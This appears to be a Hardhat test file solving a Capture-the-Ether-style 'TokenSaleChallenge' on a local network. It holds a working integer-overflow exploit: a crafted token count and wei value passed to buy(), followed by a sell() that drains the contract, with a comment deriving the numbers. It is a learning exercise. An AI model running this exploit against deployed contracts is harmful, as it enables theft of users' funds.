import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    console.log((2**256)/(10**18) + 1);
    /*  1 token = 1 ether = 10^18 
        Overflow logic when buying tokens:
          2^256 = 0, (2^256) + 1 = 1  
          require(msg.value = numTokens * PRICE_PER_TOKEN) OR
          1 ether =  X * 10^18
          cause an overflow(add '0') 2^256 + 1 ether = X *10^18 
          => X * 10^18 = 2^256 + 10^18
          => X = (2^256 + 10^18)/ 10^18 = 2^256/10^18 + 1
          => X ~= 115792089237316195423570985008687907853269984665640564039458
          All together: msg.value = X * 10^18
                                  = 415992086870360064
    */
    ///let overflowVal = "115792089237316195423570985008687907853269984665640564039457";
    let overflowVal ="115792089237316195423570985008687907853269984665640564039458";
    let buyTx = await target.buy(overflowVal, {value: "415992086870360064",});
    await buyTx.wait();
    console.log("My balance: ", await target.balanceOf(attacker.address));
    console.log("Contract balance: ", utils.formatEther(await provider.getBalance(target.address)));
    let sellTx = await target.sell(1);
    await sellTx.wait();
    expect(await target.isComplete()).to.equal(true);
  });
});
